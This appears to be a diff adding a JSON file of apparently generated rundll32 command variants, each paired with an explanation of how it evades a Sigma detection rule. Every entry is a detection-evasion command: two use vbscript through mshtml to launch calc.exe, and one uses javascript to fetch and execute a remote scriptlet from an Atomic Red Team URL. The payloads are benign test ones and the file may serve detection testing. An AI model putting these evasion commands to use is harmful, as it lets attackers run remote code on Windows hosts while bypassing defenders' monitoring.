@@ -1,0 +1,14 @@
+[
+  {
+    "output": "rundll32 vbscript:\"\\..\mshtml,#135\" +String(CreateObject(\"WScript.Shell\").Run(\"calc.exe\"),0)",
+    "explanation": "This command uses insertion of quotes and escape characters to bypass the Sigma rule while maintaining the same functionality. The rule checks for the presence of '\\..\\', 'mshtml', and '#135' in the command line. By escaping the quotes and ensuring the structure is valid, the command remains functionally equivalent but may evade detection."
+  },
+  {
+    "output": "rundll32.exe javascript:\"\\..\mshtml,RunHTMLApplication\" ;document.write();GetObject(\"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct\").Exec();window.close();",
+    "explanation": "This command uses insertion and encoding techniques to alter the command line structure. The use of quotes and escape characters changes the parsing context slightly, potentially evading the rule's string-based detection while preserving the original behavior."
+  },
+  {
+    "output": "rundll32 vbscript:\"\\..\mshtml,RunHTMLApplication\" +String(CreateObject(\"WScript.Shell\").Run(\"calc.exe\"),0)",
+    "explanation": "This command uses substitution and insertion techniques. The command line is modified by adding escape characters and reformatting the string to change the parsing context. This may help evade the rule's detection while maintaining the same execution behavior."
+  }
+]
